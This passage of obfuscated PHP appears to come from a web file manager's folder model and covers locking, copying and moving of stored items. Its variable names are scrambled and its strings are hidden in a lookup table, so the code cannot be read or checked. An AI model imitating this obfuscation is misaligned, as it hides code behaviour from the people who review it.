$èÛìì½·[631]), $Ï÷¹¤È); } public function lockWriteStart($ˆĞòüÈ, $öêàÎÒ = '') { $÷‘íƒÍá =& $_SERVER[ç¦¬”œš]; if (!$this->allowLock()) { return; } $this->_lockCheck($÷‘íƒÍá[628], $ˆĞòüÈ); $èˆ¬’’ = 1; $this->_lockKey($÷‘íƒÍá[632] . $ˆĞòüÈ . $÷‘íƒÍá[10] . $öêàÎÒ, $èˆ¬’’); $this->_lockEvent($ˆĞòüÈ, array($÷‘íƒÍá[627], $÷‘íƒÍá[629]), $èˆ¬’’); $this->_lockParent($ˆĞòüÈ, array($÷‘íƒÍá[627], $÷‘íƒÍá[629]), $èˆ¬’’); $this->_lockCheckEnd($÷‘íƒÍá[628], $ˆĞòüÈ); } public function lockWriteEnd($¢˜Úóâè, $÷ªÕ€êØ = '') { $©ïŞÎÊ­ =& $_SERVER[ç¦¬”œš]; if (!$this->allowLock()) { return; } $À—Ï÷Ã€ = 0; $this->_lockKey($©ïŞÎÊ­[632] . $¢˜Úóâè . $©ïŞÎÊ­[10] . $÷ªÕ€êØ, $À—Ï÷Ã€); $this->_lockEvent($¢˜Úóâè, array($©ïŞÎÊ­[627], $©ïŞÎÊ­[629]), $À—Ï÷Ã€); $this->_lockParent($¢˜Úóâè, array($©ïŞÎÊ­[627], $©ïŞÎÊ­[629]), $À—Ï÷Ã€); } public function lockMoveStart($ôêˆ°Ææ) { $—¥Èóƒ =& $_SERVER[ç¦¬”œš]; if (!$this->allowLock()) { return; } $this->_lockCheck($—¥Èóƒ[629], $ôêˆ°Ææ); $–ñÇô´ = 1; $this->_lockKey($—¥Èóƒ[633] . $ôêˆ°Ææ, $–ñÇô´); $this->_lockEvent($ôêˆ°Ææ, array($—¥Èóƒ[627], $—¥Èóƒ[628]), $–ñÇô´); $this->_lockParent($ôêˆ°Ææ, array($—¥Èóƒ[627], $—¥Èóƒ[629]), $–ñÇô´); $this->_lockEvent($ôêˆ°Ææ, array($—¥Èóƒ[634], $—¥Èóƒ[630], $—¥Èóƒ[631]), $–ñÇô´); $this->_lockCheckEnd($—¥Èóƒ[629], $ôêˆ°Ææ); } public function lockMoveEnd($ÅŞÑ™ªÑ) { $®õ—‘ =& $_SERVER[ç¦¬”œš]; if (!$this->allowLock()) { return; } $‡Š˜İöµ = 0; $this->_lockKey($®õ—‘[633] . $ÅŞÑ™ªÑ, $‡Š˜İöµ); $this->_lockEvent($ÅŞÑ™ªÑ, array($®õ—‘[627], $®õ—‘[628]), $‡Š˜İöµ); $this->_lockParent($ÅŞÑ™ªÑ, array($®õ—‘[627], $®õ—‘[629]), $‡Š˜İöµ); $this->_lockEvent($ÅŞÑ™ªÑ, array($®õ—‘[634], $®õ—‘[630], $®õ—‘[631]), $‡Š˜İöµ); } private function _lockCheck($¾€³´¡¿, $öÇêÎ…î) { $µã¼©ï =& $_SERVER[ç¦¬”œš]; $şÑè’½ = $this->sourceInfo($öÇêÎ…î); $€îµ–…Å = $¾€³´¡¿ . $µã¼©ï[10] . $öÇêÎ…î; $this->_lockTimeStart[$€îµ–…Å] = timeFloat(); if (!is_array($şÑè’½)) { return; } $ÍşŸ¡®± = LNG($µã¼©ï[635]); CacheLock::setErrorMsg($µã¼©ï[176] . htmlspecialchars($şÑè’½[$µã¼©ï[32]]) . $µã¼©ï[178] . $ÍşŸ¡®±); $this->_lockKey($€îµ–…Å, 1); $this->_lockKey($€îµ–…Å, 0); $–Ø‘õô¡ = array_reverse($this->parentLevelArray($şÑè’½[$µã¼©ï[593]])); foreach ($–Ø‘õô¡ as $…‘¶À) { $€îµ–…Å = $¾€³´¡¿ . $µã¼©ï[636] . $…‘¶À; if (CacheLock::lockGet($µã¼©ï[637] . $€îµ–…Å)) { $şÑè’½ = $this->sourceInfo($…‘¶À); CacheLock::setErrorMsg($µã¼©ï[176] . htmlspecialchars($şÑè’½[$µã¼©ï[32]]) . $µã¼©ï[178] . $ÍşŸ¡®±); $this->_lockKey($€îµ–…Å, 1); $this->_lockKey($€îµ–…Å, 0); } } } private function _lockCheckEnd($§µç€ÔÄ, $üïÈÍç‡) { $•™“ü­« =& $_SERVER[ç¦¬”œš]; $ÑİˆÕ° = $§µç€ÔÄ . $•™“ü­«[10] . $üïÈÍç‡; CacheLock::setErrorMsg($•™“ü­«[454]); if (!isset($this->_lockTimeStart[$ÑİˆÕ°])) { return; } $ø«’—…â = timeFloat() - $this->_lockTimeStart[$ÑİˆÕ°]; unset($this->_lockTimeStart[$ÑİˆÕ°]); if ($ø«’—…â > 0.5) { unset(self::$cacheSourceInfo[$•™“ü­«[542] . $üïÈÍç‡]); } $¤çßö†‡ = $this->sourceInfo($üïÈÍç‡); if (!$¤çßö†‡) { show_json(LNG($•™“ü­«[108]), !1); } } private function _lockParent($õïÁÏùŒ, $ºÛÚ©Ş´, $Õ†Â±«£) { if (!$this->autoLockSet) { return; } $·ÉŸ¯ = $this->sourceInfo($õïÁÏùŒ); if (!is_array($·ÉŸ¯)) { return; } $ÇÆŸå¹¤ = array_reverse($this->parentLevelArray($·ÉŸ¯[$_SERVER[ç¦¬”œš][593]])); foreach ($ÇÆŸå¹¤ as $Ÿå‘å¾Û) { $this->_lockEvent($Ÿå‘å¾Û, $ºÛÚ©Ş´, $Õ†Â±«£); } } private function _lockEvent($¯Æˆ•ú, $‘÷©”Í“, $ÎÏ¢Ú„™) { $”¸à¸È© =& $_SERVER[ç¦¬”œš]; if (!$this->autoLockSet) { return; } foreach ($‘÷©”Í“ as $İŒÉñµ) { $½á‚òÛ„ = $İŒÉñµ . $”¸à¸È©[10] . $¯Æˆ•ú; if ($ÎÏ¢Ú„™ && CacheLock::lockGet($”¸à¸È©[637] . $½á‚òÛ„)) { continue; } $this->_lockKey($½á‚òÛ„, $ÎÏ¢Ú„™); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($‚†º”ÁÖ, $œØ¶°Ó = 1) { $Ú”˜Ó÷» = $_SERVER[ç¦¬”œš][637] . md5($‚†º”ÁÖ); if ($œØ¶°Ó) { if (isset(self::$_lockItemArr[$Ú”˜Ó÷»])) { return; } self::$_lockItemArr[$Ú”˜Ó÷»] = 1; CacheLock::lock($Ú”˜Ó÷», $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ú”˜Ó÷»])) { return; } unset(self::$_lockItemArr[$Ú”˜Ó÷»]); CacheLock::unlock($Ú”˜Ó÷»); } } public function isParentOf($Ìˆ¡•ŞÅ, $–ñÈ¥Ô¦) { $Ã³Â×®Ú =& $_SERVER[ç¦¬”œš]; $Ûü„˜ç™ = $this->sourceInfo($Ìˆ¡•ŞÅ); $áÂ êÏç = $this->sourceInfo($–ñÈ¥Ô¦); $©†×Ïï¢ = $Ûü„˜ç™[$Ã³Â×®Ú[593]] . $Ûü„˜ç™[$Ã³Â×®Ú[193]] . $Ã³Â×®Ú[50]; $Îû¥—Œü = $áÂ êÏç[$Ã³Â×®Ú[593]] . $áÂ êÏç[$Ã³Â×®Ú[193]] . $Ã³Â×®Ú[50]; $‚§¦‚ÈÅ = strpos($Îû¥—Œü, $©†×Ïï¢) === 0; return $‚§¦‚ÈÅ; } private $targetIsDelete = 0; public function copy($³ ãíÛ, $òå£àÎá, $çè·Ğ›Ô = REPEAT_REPLACE, $ë´Æ»İğ = '') { $²‹Ùõ¾˜ =& $_SERVER[ç¦¬”œš]; $´­«´ãš = $this->sourceInfo($³ ãíÛ); $ÛéÈ´™Á = $this->sourceInfo($òå£àÎá); if (!$´­«´ãš || !$ÛéÈ´™Á || $ÛéÈ´™Á[$²‹Ùõ¾˜[494]] != $²‹Ùõ¾˜[91]) { return !1; } if ($this->isParentOf($³ ãíÛ, $òå£àÎá)) { return !1; } $ô»®ÖĞ’ = $ë´Æ»İğ ? $ë´Æ»İğ : $´­«´ãš[$²‹Ùõ¾˜[32]]; $this->lockCopyStart($³ ãíÛ); $this->lockWriteStart($òå£àÎá, $ô»®ÖĞ’); $è‚•¬Á = array($²‹Ùõ¾˜[638] => array(), $²‹Ùõ¾˜[639] => array(), $²‹Ùõ¾˜[640] => array()); $this->targetIsDelete = intval($´­«´ãš[$²‹Ùõ¾˜[514]]); $Æ‰í¢  = $this->fileNameExistAuto($òå£àÎá, $´­«´ãš); $ĞÃëÌØ = $this->_copy($³ ãíÛ, $òå£àÎá, $çè·Ğ›Ô, $è‚•¬Á, !0, $ë´Æ»İğ); $this->_childrenListClear(); $this->lockCopyEnd($³ ãíÛ); $this->lockWriteEnd($òå£àÎá, $ô»®ÖĞ’); if ($´­«´ãš[$²‹Ùõ¾˜[494]] == $²‹Ùõ¾˜[91] && $Æ‰í¢  == $ĞÃëÌØ) { $this->folderSizeResetChildren($Æ‰í¢ ); } Model($²‹Ùõ¾˜[641])->addAll($è‚•¬Á[$²‹Ùõ¾˜[639]], array(), !0); if ($Æ‰í¢  != $ĞÃëÌØ || $´­«´ãš[$²‹Ùõ¾˜[494]] == $²‹Ùõ¾˜[91]) { Model($²‹Ùõ¾˜[642])->eventCopy($ĞÃëÌØ); } $this->saveAll($è‚•¬Á[$²‹Ùõ¾˜[640]]); Model($²‹Ùõ¾˜[230])->linkAdd($è‚•¬Á[$²‹Ùõ¾˜[638]]); $this->folderSizeReset($òå£àÎá); $this->updateModifyTime($òå£àÎá); return $ĞÃëÌØ; } private function _copy($‚“ËŞ–¨, $Û à’ò, $Ë¥§ô¼¹, &$¨å°Ğ¡Ê, $àÎá™ƒ™, $ş¥´Ú­ğ = '') { $¯ñ¦ËœÚ =& $_SERVER[ç¦¬”œš]; $êî—–…â = $this->sourceInfoCache($‚“ËŞ–¨); $öò†½ß¬ = $êî—–…â[$¯ñ¦ËœÚ[494]] == $¯ñ¦ËœÚ[91]; $¢Ÿ¨“¦ = $ş¥´Ú­ğ ? $ş¥´Ú­ğ : $êî—–…â[$¯ñ¦ËœÚ[32]]; $á¹†© = $this->fileNameExistAuto($Û à’ò, $êî—–…â); if ($àÎá™ƒ™) { $this->_childrenAllMake($‚“ËŞ–¨); if ($öò†½ß¬ && $á¹†©) { $this->_childrenAllMake($á¹†©); } } if (!$á¹†©) { return $this->_copyCreate($‚“ËŞ–¨, $Û à’ò, $¢Ÿ¨“¦, $¨å°Ğ¡Ê); } $À±£Œô = $á¹†©; if ($öò†½ß¬) { if ($Ë¥§ô¼¹ == REPEAT_RENAME_FOLDER) { $¢Ÿ¨“¦ = $this->fileNameAutoCache($Û à’ò, $¢Ÿ¨“¦, $Ë¥§ô¼¹, $öò†½ß¬); $À±£Œô = $this->_copyCreate($‚“ËŞ–¨, $Û à’ò, $¢Ÿ¨“¦, $¨å°Ğ¡Ê); } else { $¹®•¼Œ = $this->_childrenList($‚“ËŞ–¨); foreach ($¹®•¼Œ as $¦ß’´½Ñ) { $this->_copy($¦ß’´½Ñ[$¯ñ¦ËœÚ[193]], $á¹†©, $Ë¥§ô¼¹, $¨å°Ğ¡Ê, !1); } } } else { if ($Ë¥§ô¼¹ == REPEAT_RENAME || $Ë¥§ô¼¹ == REPEAT_RENAME_FOLDER) { $¢Ÿ¨“¦ = $this->fileNameAutoCache($Û à’ò, $¢Ÿ¨“¦, $Ë¥§ô¼¹, $öò†½ß¬); $À±£Œô = $this->_copyCreate($‚“ËŞ–¨, $Û à’ò, $¢Ÿ¨“¦, $¨å°Ğ¡Ê); } else { if ($Ë¥§ô¼¹ == REPEAT_REPLACE) { $»Ó¿ìÖá = $this->sourceInfoCache($á¹†©); $µåÔ¬èÏ = $this->fileHistory($»Ó¿ìÖá, $êî—–…â[$¯ñ¦ËœÚ[550]], $êî—–…â[$¯ñ¦ËœÚ[79]]); if ($µåÔ¬èÏ) { $¨å°Ğ¡Ê[$¯ñ¦ËœÚ[638]][] = $êî—–…â[$¯ñ¦ËœÚ[550]]; } } else { if ($Ë¥§ô¼¹ == REPEAT_SKIP) { } } } Hook::trigger($¯ñ¦ËœÚ[643], array($¯ñ¦ËœÚ[644], $êî—–…â, 0)); } return $À±£Œô; } private function _copyCreate($ÆË´­ßî, $Şîˆ·İ, $”®íí†, &$À¼€Êü½) { $ ®Ä›¥‡ =& $_SERVER[ç¦¬”œš]; $Ÿ¥âÕÁş = $this->sourceInfoCache($ÆË´­ßî); $»ØâÀü = $this->sourceInfoCache($Şîˆ·İ); $‘½—óœé = $this->_makeItemData($Ÿ¥âÕÁş, $»ØâÀü, $”®íí†); Hook::trigger($ ®Ä›¥‡[645], $‘½—óœé); Hook::trigger($ ®Ä›¥‡[646], array($ ®Ä›¥‡[647], $‘½—óœé, 0)); $áùñí²ª = $this->add($‘½—óœé); $ÍÕ™ò¹… = array($ ®Ä›¥‡[193] => $áùñí²ª, $ ®Ä›¥‡[32] => $”®íí†); $this->_copyApplyMeta($ÍÕ™ò¹…, $À¼€Êü½); if ($Ÿ¥âÕÁş[$ ®Ä›¥‡[494]] != $ ®Ä›¥‡[91]) { $À¼€Êü½[$ ®Ä›¥‡[638]][] = $Ÿ¥âÕÁş[$ ®Ä›¥‡[550]]; return $áùñí²ª; } $ÒÂöÊı½ = array(); $úüİ—ë = array(); $this->_childrenListAll($ÆË´­ßî, $ÒÂöÊı½); $¡áÏğ« = count($ÒÂöÊı½); if ($¡áÏğ« == 0) { return $áùñí²ª; } $ö­œÀğ¿ = $this->sourceInfo($áùñí²ª); foreach ($ÒÂöÊı½ as $ öù…) { $‡³ÅÙÉ— = $this->_makeItemData($ öù…, $ö­œÀğ¿, $ öù…[$ ®Ä›¥‡[32]]); $‡³ÅÙÉ—[$ ®Ä›¥‡[593]] = $ öù…[$ ®Ä›¥‡[593]]; $úüİ—ë[] = $‡³ÅÙÉ—; } $this->chunkEventSet($ ®Ä›¥‡[648], array($ ®Ä›¥‡[649], $‘½—óœé, $¡áÏğ«)); $this->addAll($úüİ—ë, array(), !1); $çƒÚ¾ö« = $this->where(array($ ®Ä›¥‡[192] => $áùñí²ª))->select(); $ĞÉµ§İõ = $this->_childrenMakeRelation($ÒÂöÊı½, $çƒÚ¾ö«); $ĞÉµ§İõ[$ÆË´­ßî] = $áùñí²ª; $”Ğ¡ÒŞ« = array(); $Âº½ËŒØ = array(); foreach ($çƒÚ¾ö« as $ öù…) { $—ñÅ»á• = $ öù…[$ ®Ä›¥‡[193]]; $íØ¾¤ú´ = $this->_childrenMatch($ĞÉµ§İõ, $ öù…, $ö­œÀğ¿); $”Ğ¡ÒŞ«[] = array($ ®Ä›¥‡[193], $—ñÅ»á•, $ ®Ä›¥‡[192], $íØ¾¤ú´[$ ®Ä›¥‡[192]]); $Âº½ËŒØ[] = array($ ®Ä›¥‡[193], $—ñÅ»á•, $ ®Ä›¥‡[593], $íØ¾¤ú´[$ ®Ä›¥‡[593]]); $this->_copyApplyMeta($ öù…, $À¼€Êü½); if ($ öù…[$ ®Ä›¥‡[494]] != $ ®Ä›¥‡[91]) { $À¼€Êü½[$ ®Ä›¥‡[638]][] = $ öù…[$ ®Ä›¥‡[550]]; } } $this->chunkEventSet($ ®Ä›¥‡[650], array($ ®Ä›¥‡[651], $‘½—óœé, $¡áÏğ«)); $this->saveAll($”Ğ¡ÒŞ«); $this->chunkEventSet($ ®Ä›¥‡[652], array($ ®Ä›¥‡[653], $‘½—óœé, $¡áÏğ«)); $this->saveAll($Âº½ËŒØ); return $áùñí²ª; } private function _childrenMakeRelation($ó¢Ë¼àı, $ô÷†€Ê®) { $ÆÔ—œ« =& $_SERVER[ç¦¬”œš]; $²¦ÚËí = array(); $çÅ»‰÷Ğ = array(); foreach ($ó¢Ë¼àı as $¨¦—µİ•) { $¸©ˆ…¦í = $¨¦—µİ•[$ÆÔ—œ«[32]] . $ÆÔ—œ«[8] . $¨¦—µİ•[$ÆÔ—œ«[593]]; $²¦ÚËí[$¸©ˆ…¦í] = $¨¦—µİ•[$ÆÔ—œ«[193]]; } foreach ($ô÷†€Ê® as $¨¦—µİ•) { $¸©ˆ…¦í = $¨¦—µİ•[$ÆÔ—œ«[32]] . $ÆÔ—œ«[8] . $¨¦—µİ•[$ÆÔ—œ«[593]]; $»€Â¼ = $²¦ÚËí[$¸©ˆ…¦í]; $çÅ»‰÷Ğ[$»€Â¼] = $¨¦—µİ•[$ÆÔ—œ«[193]]; } return $çÅ»‰÷Ğ; } private function _childrenMatch($èªÇ¬ Ş, $â‚²ƒÎå, $Ú„¿ş—) { $²Š†æ• =& $_SERVER[ç¦¬”œš]; $ÇšÒĞÕ€ = $Ú„¿ş—[$²Š†æ•[593]]; $Ø³ç§ëÄ = $this->parentLevelArray($â‚²ƒÎå[$²Š†æ•[593]]); foreach ($Ø³ç§ëÄ as $«”Ğàï…) { if (isset($èªÇ¬ Ş[$«”Ğàï…])) { $ÇšÒĞÕ€ .= $èªÇ¬ Ş[$«”Ğàï…] . $²Š†æ•[654]; } } $ÇšÒĞÕ€ = rtrim($ÇšÒĞÕ€, $²Š†æ•[50]) . $²Š†æ•[50]; $†âéî¯Ì = $this->parentLevelArray($ÇšÒĞÕ€); $İìü³üõ = $†âéî¯Ì[count($†âéî¯Ì) - 1]; return array($²Š†æ•[192] => $İìü³üõ, $²Š†æ•[593] => $ÇšÒĞÕ€); } private function _makeItemData($ İ¥“µ£, $ë«ìÅçš, $µÄÛŞ£•) { $§Ò¡ïŠ’ =& $_SERVER[ç¦¬”œš]; $ïŒè‹Ëù = array($§Ò¡ïŠ’[655] => $ İ¥“µ£[$§Ò¡ïŠ’[494]], $§Ò¡ïŠ’[503] => $µÄÛŞ£•, $§Ò¡ïŠ’[656] => $ İ¥“µ£[$§Ò¡ïŠ’[495]] ? $ İ¥“µ£[$§Ò¡ïŠ’[495]] : $§Ò¡ïŠ’[12], $§Ò¡ïŠ’[551] => $ İ¥“µ£[$§Ò¡ïŠ’[550]] ? $ İ¥“µ£[$§Ò¡ïŠ’[550]] : 0, $§Ò¡ïŠ’[626] => $ İ¥“µ£[$§Ò¡ïŠ’[79]] ? $ İ¥“µ£[$§Ò¡ïŠ’[79]] : 0, $§Ò¡ïŠ’[657] => intval($ë«ìÅçš[$§Ò¡ïŠ’[190]]), $§Ò¡ïŠ’[658] => intval($ë«ìÅçš[$§Ò¡ïŠ’[578]]), $§Ò¡ïŠ’[659] => intval(USER_ID), $§Ò¡ïŠ’[660] => intval(USER_ID), $§Ò¡ïŠ’[486] => intval($ë«ìÅçš[$§Ò¡ïŠ’[193]]), $§Ò¡ïŠ’[661] => $ë«ìÅçš[$§Ò¡ïŠ’[593]] . $ë«ìÅçš[$§Ò¡ïŠ’[193]] . $§Ò¡ïŠ’[50], $§Ò¡ïŠ’[507] => $ İ¥“µ£[$§Ò¡ïŠ’[88]] ? $ İ¥“µ£[$§Ò¡ïŠ’[88]] : time(), $§Ò¡ïŠ’[513] => 0, $§Ò¡ïŠ’[662] => $§Ò¡ïŠ’[12]); return $ïŒè‹Ëù; } private function _copyApplyMeta($Šù¨å§Ü, &$‡Ì»ëú­) { $Ü¾÷€¨ =& $_SERVER[ç¦¬”œš]; $ğé†µ« = $Šù¨å§Ü[$Ü¾÷€¨[193]]; $´Èšè¥½ = $Šù¨å§Ü[$Ü¾÷€¨[32]]; if (!isset($Šù¨å§Ü[$Ü¾÷€¨[663]]) || !$Šù¨å§Ü[$Ü¾÷€¨[663]] || $Šù¨å§Ü[$Ü¾÷€¨[663]] == $Ü¾÷€¨[228]) { $‡Ì»ëú­[$Ü¾÷€¨[640]][] = array($Ü¾÷€¨[193], $ğé†µ«, $Ü¾÷€¨[663], short_id($ğé†µ«)); } if (Input::check($´Èšè¥½, $Ü¾÷€¨[664])) { $‡Ì»ëú­[$Ü¾÷€¨[639]][] = array($Ü¾÷€¨[193] => $ğé†µ«, $Ü¾÷€¨[97] => $Ü¾÷€¨[547], $Ü¾÷€¨[450] => str_replace($Ü¾÷€¨[53], $Ü¾÷€¨[12], Pinyin::get($´Èšè¥½))); $‡Ì»ëú­[$Ü¾÷€¨[639]][] = array($Ü¾÷€¨[193] => $ğé†µ«, $Ü¾÷€¨[97] => $Ü¾÷€¨[546], $Ü¾÷€¨[450] => Pinyin::get($´Èšè¥½, $Ü¾÷€¨[665])); } $‡Ì»ëú­[$Ü¾÷€¨[639]][] = array($Ü¾÷€¨[193] => $ğé†µ«, $Ü¾÷€¨[97] => $Ü¾÷€¨[526], $Ü¾÷€¨[450] => KodSort::makeStr($´Èšè¥½)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($å“ëÒë½) { $œò‚â =& $_SERVER[ç¦¬”œš]; $Ê™Ç’í“ = $this->sourceInfo($å“ëÒë½); $óãÊìé§ = $œò‚â[666]; $ÑÔƒìö = array($œò‚â[593] => array($œò‚â[621], $Ê™Ç’í“[$œò‚â[593]] . $å“ëÒë½ . $œò‚â[622]), $œò‚â[514] => $this->targetIsDelete); $°íÛ¬Æ = $this->field($óãÊìé§)->where($ÑÔƒìö)->select(); if (!$°íÛ¬Æ) { return; } $°íÛ¬Æ = array_to_keyvalue($°íÛ¬Æ, $œò‚â[193]); foreach ($°íÛ¬Æ as $ì”İàºË) { $Äì…ÒĞı = $ì”İàºË[$œò‚â[192]]; $å“ëÒë½ = $ì”İàºË[$œò‚â[193]]; if (!isset($this->_childrenListCache[$å“ëÒë½]) && $ì”İàºË[$œò‚â[494]] == $œò‚â[91]) { $this->_childrenListCache[$å“ëÒë½] = array(); } if (!isset($this->_childrenListCache[$Äì…ÒĞı])) { $this->_childrenListCache[$Äì…ÒĞı] = array(); } $this->_childrenListCache[$Äì…ÒĞı][$å“ëÒë½] = $ì”İàºË; $this->_childrenItemCache[$å“ëÒë½] = $ì”İàºË; } } private function _childrenListAll($Ëâ¶Îô®, &$ü™ÍÁû) { $áµµ»úº =& $_SERVER[ç¦¬”œš]; if (!isset($this->_childrenListCache[$Ëâ¶Îô®])) { return; } $‹îñ«ëÉ = $this->_childrenListCache[$Ëâ¶Îô®]; foreach ($‹îñ«ëÉ as $òŞ÷Æö => $‰µ·ÔöÁ) { $ü™ÍÁû[$òŞ÷Æö] = $‰µ·ÔöÁ; if ($‰µ·ÔöÁ[$áµµ»úº[494]] == $áµµ»úº[91]) { $this->_childrenListAll($òŞ÷Æö, $ü™ÍÁû); } } } private function sourceInfoCache($µ¬º«’¡) { if (isset($this->_childrenItemCache[$µ¬º«’¡])) { return $this->_childrenItemCache[$µ¬º«’¡]; } return $this->sourceInfo($µ¬º«’¡); } private function _childrenList($ñ•Õé“) { if (isset($this->_childrenListCache[$ñ•Õé“])) { return $this->_childrenListCache[$ñ•Õé“]; } return $this->_childrenListSelect($ñ•Õé“); } private function _childrenListSelect($Ïïµ³ıª) { $Ãß–ß« =& $_SERVER[ç¦¬”œš]; $Ì­ˆ = array($Ãß–ß«[192] => $Ïïµ³ıª, $Ãß–ß«[514] => $this->targetIsDelete); $ïÔí‘øÇ = $this->where($Ì­ˆ)->select(); $ïÔí‘øÇ = $ïÔí‘øÇ ? $ïÔí‘øÇ : array(); $ØŠö˜ıÂ = array_to_keyvalue($ïÔí‘øÇ, $Ãß–ß«[193]); $this->_childrenListCache[$Ïïµ³ıª] = $ØŠö˜ıÂ; foreach ($ØŠö˜ıÂ as $Ïïµ³ıª => $³ÏÚŠ‘Ú) { $this->_childrenItemCache[$Ïïµ³ıª] = $³ÏÚŠ‘Ú; } return $ØŠö˜ıÂ; } private function fileNameExistAuto($“óÆ€¡Ú, $¨Î Œ’) { $‹Š‰£¼„ =& $_SERVER[ç¦¬”œš]; if ($¨Î Œ’[$‹Š‰£¼„[514]] == $‹Š‰£¼„[91]) { return $this->fileNameExist($“óÆ€¡Ú, $¨Î Œ’[$‹Š‰£¼„[32]]); } return $this->fileNameExistCache($“óÆ€¡Ú, $¨Î Œ’[$‹Š‰£¼„[32]]); } private function fileNameExistCache($‘©µ¨™’, $–¯÷Ğ° ) { $õ‹ëÍ× =& $_SERVER[ç¦¬”œš]; $–¯÷Ğ°  = strtolower($–¯÷Ğ° ); $ñ½ş¿æ¸ = $this->_childrenList($‘©µ¨™’); foreach ($ñ½ş¿æ¸ as $–…ßÛ’Ÿ) { if ($–¯÷Ğ°  == strtolower($–…ßÛ’Ÿ[$õ‹ëÍ×[32]])) { return $–…ßÛ’Ÿ[$õ‹ëÍ×[193]]; } } return !1; } private function fileNameAutoCache($ÓØ¡äÉ , $Ã©­‡‚‹, $°äŠÒñ¼, $Äò«¯‡) { $ØÈ‰ÜÀø =& $_SERVER[ç¦¬”œš]; $ÔçËÆğú = $this->_childrenList($ÓØ¡äÉ ); $™ó‹Ü· = array_to_keyvalue($ÔçËÆğú, $ØÈ‰ÜÀø[12], $ØÈ‰ÜÀø[32]); return $this->fileNameAutoGet($™ó‹Ü·, $Ã©­‡‚‹, $°äŠÒñ¼, $Äò«¯‡); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Êşæ®ù©, $«ÔÖ–ŸÛ, $ËÅ´ÏŒ = REPEAT_REPLACE, $æôª¢Ìé = '') { $Ô˜ÏºÑÙ =& $_SERVER[ç¦¬”œš]; $§¾îôÀ­ = $this->sourceInfo($Êşæ®ù©); $”è€¯­ò = $this->sourceInfo($«ÔÖ–ŸÛ); if ($§¾îôÀ­[$Ô˜ÏºÑÙ[192]] == $”è€¯­ò[$Ô˜ÏºÑÙ[193]]) { if ($§¾îôÀ­[$Ô˜ÏºÑÙ[514]] == $Ô˜ÏºÑÙ[91]) { Model($Ô˜ÏºÑÙ[512])->restore(array($Êşæ®ù©)); } if (!$æôª¢Ìé || $æôª¢Ìé == $§¾îôÀ­[$Ô˜ÏºÑÙ[32]]) { return $Êşæ®ù©; } } $¹›Ó™Üœ = $this->pathInfoMore($Êşæ®ù©); if ($this->isParentOf($Êşæ®ù©, $«ÔÖ–ŸÛ)) { return !1; } if (!$§¾îôÀ­ || !$”è€¯­ò || $”è€¯­ò[$Ô˜ÏºÑÙ[494]] != $Ô˜ÏºÑÙ[91]) { return !1; } Hook::trigger($Ô˜ÏºÑÙ[667], $¹›Ó™Üœ); $this->targetIsDelete = intval($§¾îôÀ­[$Ô˜ÏºÑÙ[514]]); if ($§¾îôÀ­[$Ô˜ÏºÑÙ[192]] == $«ÔÖ–ŸÛ && $æôª¢Ìé != $§¾îôÀ­[$Ô˜ÏºÑÙ[32]]) { $İœäú²Î = $this->fileNameExist($«ÔÖ–ŸÛ, $æôª¢Ìé); if ($İœäú²Î && $§¾îôÀ­[$Ô˜ÏºÑÙ[494]] == $Ô˜ÏºÑÙ[228]) { $ã©”¤„Â = $this->sourceInfo($İœäú²Î); $íû‡›¹¶ = $this->fileHistory($ã©”¤„Â, $§¾îôÀ­[$Ô˜ÏºÑÙ[550]], $§¾îôÀ­[$Ô˜ÏºÑÙ[79]]); if (!$íû‡›¹¶) { Model($Ô˜ÏºÑÙ[553])->remove($§¾îôÀ­[$Ô˜ÏºÑÙ[550]]); } $this->removeNow($Êşæ®ù©, !1); $this->folderSizeReset($«ÔÖ–ŸÛ); Hook::trigger($Ô˜ÏºÑÙ[668], $¹›Ó™Üœ); return $İœäú²Î; } } $–Ü”ßÀ = $æôª¢Ìé ? $æôª¢Ìé : $§¾îôÀ­[$Ô˜ÏºÑÙ[32]]; $this->lockMoveStart($Êşæ®ù©); $this->lockWriteStart($«ÔÖ–ŸÛ, $–Ü”ßÀ); $µííåó = array($Ô˜ÏºÑÙ[638] => array(), $Ô˜ÏºÑÙ[669] => !1); $this->clearShare($Êşæ®ù©, $«ÔÖ–ŸÛ); $şíø‰ = $this->fileNameExistAuto($«ÔÖ–ŸÛ, $§¾îôÀ­); $ï€¤øíß = $this->_move($Êşæ®ù©, $«ÔÖ–ŸÛ, $ËÅ´ÏŒ, $µííåó, $æôª¢Ìé); $this->sourceCacheClear(); if ($§¾îôÀ­[$Ô˜ÏºÑÙ[494]] == $Ô˜ÏºÑÙ[91] && $şíø‰) { $this->folderSizeResetChildren($ï€¤øíß); } Model($Ô˜ÏºÑÙ[230])->linkAdd($µííåó[$Ô˜ÏºÑÙ[638]]); if ($şíø‰ && $µííåó[$Ô˜ÏºÑÙ[669]]) { $this->removeNow($Êşæ®ù©, !1); } $this->lockMoveEnd($Êşæ®ù©); $this->lockWriteEnd($«ÔÖ–ŸÛ, $–Ü”ßÀ); $this->folderSizeReset($§¾îôÀ­[$Ô˜ÏºÑÙ[192]]); $this->folderSizeReset($«ÔÖ–ŸÛ); $¬æÈ¬™ = array($§¾îôÀ­[$Ô˜ÏºÑÙ[192]], $«ÔÖ–ŸÛ); if ($§¾îôÀ­[$Ô˜ÏºÑÙ[494]] == $Ô˜ÏºÑÙ[91]) { $¬æÈ¬™[] = $Êşæ®ù©; } $this->updateModifyTime($¬æÈ¬™); Model($Ô˜ÏºÑÙ[642])->eventMove($Êşæ®ù©, $§¾îôÀ­[$Ô˜ÏºÑÙ[192]], $«ÔÖ–ŸÛ); Hook::trigger($Ô˜ÏºÑÙ[668], $¹›Ó™Üœ); return $ï€¤øíß; } private function _move($¢ÇşÆà÷, $†Ì¿İÀ¼, $Ô¬ğÕÙ, &$…–í½¶†, $ıŠ³¶øÓ = '') { $®ñõ»ã¡ =& $_SERVER[ç¦¬”œš]; $ºÏ’†¨¡ = $this->sourceInfo($¢ÇşÆà÷); $ãÚ¶ò³ = $ºÏ’†¨¡[$®ñõ»ã¡[494]] == $®ñõ»ã¡[91]; $¨¦Ûí½ = $ıŠ³¶øÓ ? $ıŠ³¶øÓ : $ºÏ’†¨¡[$®ñõ»ã¡[32]]; $º¿ˆğÜñ = $this->fileNameExistAuto($†Ì¿İÀ¼, $ºÏ’†¨¡); $this->lockMoveStart($¢ÇşÆà÷); 